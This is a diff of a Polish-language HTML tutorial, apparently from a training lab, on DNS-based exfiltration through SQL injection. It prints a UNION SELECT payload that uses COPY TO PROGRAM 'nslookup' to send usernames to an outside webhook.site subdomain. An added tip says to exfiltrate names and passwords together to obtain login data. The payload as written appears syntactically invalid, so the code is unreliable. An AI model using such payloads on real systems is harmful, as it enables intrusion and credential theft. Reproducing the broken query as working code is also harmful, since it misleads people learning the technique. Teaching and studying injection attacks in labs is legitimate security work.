@@ -18,7 +18,7 @@
         <div class="card">
             <div class="card-body">
                 <h4 class="card-title">1. Przygotowanie serwera DNS (np. DNSLog)</h4>
-                <p>Najpierw musisz przygotować serwer DNS, który będzie przechwytywał zapytania. Możesz użyć jednej z dostępnych usług, jak np. DNSLog, aby monitorować zapytania DNS, które będą wysyłane przez aplikację. Zarejestruj się na jednym z serwisów do monitorowania zapytań DNS.</p>
+                <p>Najpierw musisz przygotować serwer DNS, który będzie przechwytywał zapytania. Możesz użyć jednej z dostępnych usług, jak np. webhook.site, aby monitorować zapytania DNS, które będą wysyłane przez aplikację. Zarejestruj się na jednym z serwisów do monitorowania zapytań DNS.</p>
                 <p>Przykład serwisu: <a href="https://webhook.site/" target="_blank">https://webhook.site/</a></p>
                 <p>Na webhook.site otrzymasz unikalny adres, który będzie działał jako subdomena, np. <code>xxxxxxxx.webhook.site.</code>.</p>
                 <p>Niestety strona ma ograniczenia do 100 zapytań dlatego, gdy narzucimy ich za dużo baza może zwrócić błąd. Mimo wszystko będziemy mogli ich część zaobserować na stronie w oknie po lewej. </p>
@@ -33,8 +33,8 @@
                     <li><code>CONCAT(username, '.xxxxxxxx.webhook.site')</code> łączy nazwę użytkownika z subdomeną, tworząc zapytanie DNS.</li>
                 </ul>
         
-                <h4 class="card-title">3. Alternatywnie - Użycie COPY TO PROGRAM i nslookup</h4>
-                <p>Jeśli aplikacja pozwala na wykonanie zapytań systemowych, możesz użyć funkcji <code>COPY TO PROGRAM</code>, aby uruchomić zapytanie <code>nslookup</code>, które będzie próbowało rozwiązać zapytanie DNS.</p>
+                <h4 class="card-title">3.Użycie COPY TO PROGRAM i nslookup</h4>
+                <p>Jeśli aplikacja pozwala na wykonanie zapytań systemowych (w naszym przypadku działa), możesz użyć funkcji <code>COPY TO PROGRAM</code>, aby uruchomić zapytanie <code>nslookup</code>, które będzie próbowało rozwiązać zapytanie DNS.</p>
                 <p>Przykład injekcji z użyciem <code>COPY TO PROGRAM</code> i <code>nslookup</code>:</p>
                 <pre><code>' UNION SELECT 1, COPY (SELECT CONCAT(username, '.xxxxxxxx.webhook.site') FROM users) TO PROGRAM 'nslookup' --</code></pre>
                 <p>W tej injekcji SQL:</p>
@@ -44,14 +44,15 @@
                 </ul>
         
                 <h4 class="card-title">4. Wykonanie ataku i monitorowanie wyników</h4>
-                <p>Wprowadź injekcję SQL w aplikacji, w której podejrzewasz podatność na SQL Injection. Zapytanie DNS zostanie wysłane, a dane z bazy danych (np. nazwy użytkowników) pojawią się na Twoim serwerze DNS.</p>
+                <p>Wprowadź injekcję SQL w aplikacji, w której podejrzewasz podatność na SQL Injection. <strong>Połącz dwa zapytania to z <code>CONCAT</code> oraz <code> COPY TO PROGRAM</code> w celu przeprowadzeniu ataku.</strong> Zapytanie DNS zostanie wysłane, a dane z bazy danych (np. nazwy użytkowników) pojawią się na Twoim serwerze DNS.</p>
+                <p`><strong>Wskazówka: </strong> W celu zdobycia danych do logowania prześlij w jednym zapytaniu DNS od razu <code>name</code> i <code>password</code></p>
                 <ul>
-                    <li>Po wykonaniu ataku, przejdź na stronę DNSLog, aby monitorować zapytania DNS, które zostały wysłane do Twojej subdomeny (np. <code>xxxxxxxx.webhook.site</code>).</li>
+                    <li>Po wykonaniu ataku, przejdź na stronę webhook.site, aby monitorować zapytania DNS, które zostały wysłane do Twojej subdomeny (np. <code>xxxxxxxx.webhook.site</code>).</li>
                     <li>Zobaczysz zapytania, które zawierają dane z bazy danych (np. nazwę użytkownika), które zostały wyciągnięte przez atak.</li>
                 </ul>
         
                 <h4 class="card-title">5. Analiza danych</h4>
-                <p>Po przeprowadzeniu ataku, przeanalizuj zapytania DNS na stronie DNSLog, aby zobaczyć dane, które zostały przechwycone przez Twój serwer DNS. Możesz wykorzystać te informacje do dalszych działań lub weryfikacji podatności aplikacji.</p>
+                <p>Po przeprowadzeniu ataku, przeanalizuj zapytania DNS na stronie webhook.site, aby zobaczyć dane, które zostały przechwycone przez Twój serwer DNS. Możesz wykorzystać te informacje do dalszych działań lub weryfikacji podatności aplikacji.</p>
             </div>
         </div>
         
